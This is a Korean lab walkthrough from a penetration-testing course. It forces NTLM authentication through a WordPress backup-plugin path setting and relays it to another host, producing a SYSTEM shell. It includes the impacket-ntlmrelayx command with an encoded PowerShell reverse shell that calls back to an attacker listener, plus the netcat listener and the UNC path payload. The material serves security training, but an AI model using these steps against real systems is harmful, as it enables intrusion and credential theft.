# 27.5.2 릴레이 공격을 위한 WordPress 플러그인 악용

> **Abuse a WordPress Plugin for a Relay Attack** · PEN-200 §27.5.2

앞 절에서 얻은 daniela 의 평문 비밀번호로 INTERNALSRV1 의 WordPress 대시보드에 접근한 상태임. 사용자는 daniela 하나뿐이고, Settings > General 의 WordPress Address·Site Address 는 예상대로 DNS 이름이며 나머지 설정은 대체로 기본값임. 플러그인은 셋이 설치돼 있으나 활성은 **Backup Migration** 하나뿐임.

Backup Migration 의 설정 화면에는 백업 저장 위치를 넣는 **Backup directory path** 필드가 있음. 임의 경로를 넣을 수 있다는 것은 곧 **대상 시스템의 인증을 강제로 유발할 수 있다**는 뜻임.

![[PEN200-Fig-383.png]]
*백업 경로를 임의로 지정할 수 있는 Backup Migration 플러그인 설정 — 인증 강제의 발판*

여기서 공격 경로가 둘로 갈림.

첫째는 악성 WordPress 플러그인 업로드임 — 웹셸이나 리버스셸을 담아 올려 INTERNALSRV1 에서 코드 실행을 노리는 것.

둘째는 릴레이(relay) 공격이고, BloodHound 결과에 몇 가지 가정을 얹어 성립함:
- 로컬 Administrator 가 INTERNALSRV1 에 **활성 세션**을 갖고 있음 → 이 계정으로 WordPress 가 돌고 있다고 가정함
- 도메인 내 컴퓨터들의 로컬 Administrator 비밀번호가 **동일하게 설정된 경우가 드물지 않음** → 이 환경도 그렇다고 가정함
- 도메인 관리자 beccy 가 MAILSRV1 에 활성 세션을 가지므로 그 자격 증명이 **캐시돼 있을 가능성**이 있음
- MAILSRV1 과 INTERNALSRV1 모두 **SMB signing 이 비활성** → 인증을 유발할 수만 있으면 릴레이가 성립함

즉 Backup directory path 를 Kali 로 향하게 해 인증을 끌어내고, 그 인증을 MAILSRV1 로 릴레이함. 가정이 맞다면 인증 주체는 INTERNALSRV1 의 로컬 Administrator 이고 MAILSRV1 의 동명 계정과 비밀번호가 같으므로 MAILSRV1 에서 특권 코드 실행을 얻음. 거기서 beccy 의 NTLM 해시를 뽑으면 침투 테스트 목표 중 하나가 달성됨 — **단일 시스템 코드 실행에 그치지 않고 목표까지 이어지므로 릴레이를 먼저 수행함**.

먼저 `impacket-ntlmrelayx` 를 띄움. `--no-http-server` 로 HTTP 서버를 끄고 `-smb2support` 로 SMB2 를 켬. 릴레이 대상 `-t` 에는 MAILSRV1 의 **외부 주소** `192.168.50.242` 를 지정함 — 외부 주소를 쓰면 Proxychains 로 릴레이를 프록시할 필요가 없음. `-c` 에는 Kali 의 9999 번 포트로 붙는 PowerShell 리버스셸 원라이너를 base64 로 인코딩해 넘김.

```
kali@kali:~/beyond$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t
192.168.50.242 -c "powershell -enc JABjAGwAaQ..."
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Protocol Client LDAPS loaded..

[*] Protocol Client IMAPS loaded..
```

*릴레이 리스너 기동 — `-t` 와 대상 IP 가 나뉜 것은 교재 지면 폭 때문이며 실제로는 한 줄임*

리버스셸을 받을 Netcat 리스너를 9999 에 띄움.

```
kali@kali:~/beyond$ nc -nvlp 9999
listening on [any] 9999 ...
```

준비가 끝나면 Backup directory path 에 URI 참조 `//192.168.119.5/test` 를 넣고 저장함. IP 는 Kali 주소이고 `test` 는 존재하지 않는 경로임 — 저장 시점에 WordPress 를 돌리는 계정 권한으로 인증이 나감.

```
...
[*] Authenticating against smb://192.168.50.242 as INTERNALSRV1/ADMINISTRATOR SUCCEED
...
[*] Service RemoteRegistry is in stopped state
...
[*] Starting service RemoteRegistry
...
[*] Executed specified command on host: 192.168.50.242
...
[*] Stopping service RemoteRegistry
```

출력이 앞선 가정 둘을 그대로 확인해 줌 — 인증 주체가 `INTERNALSRV1/ADMINISTRATOR` 였다는 것, 그리고 그 자격 증명으로 MAILSRV1 인증에 성공했으므로 **두 시스템의 로컬 Administrator 비밀번호가 같다**는 것. 릴레이된 명령도 실행됨.

```
connect to [192.168.119.5] from (UNKNOWN) [192.168.50.242] 50063
whoami
nt authority\system
PS C:\Windows\system32> hostname
MAILSRV1
PS C:\Windows\system32>
```

INTERNALSRV1 의 WordPress 플러그인이 유발한 인증을 MAILSRV1 로 릴레이해 `NT AUTHORITY\SYSTEM` 으로 코드 실행을 얻음. 이 대화형 셸이 다음 단계에서 도메인과 도메인 컨트롤러로 가는 발판이 됨.
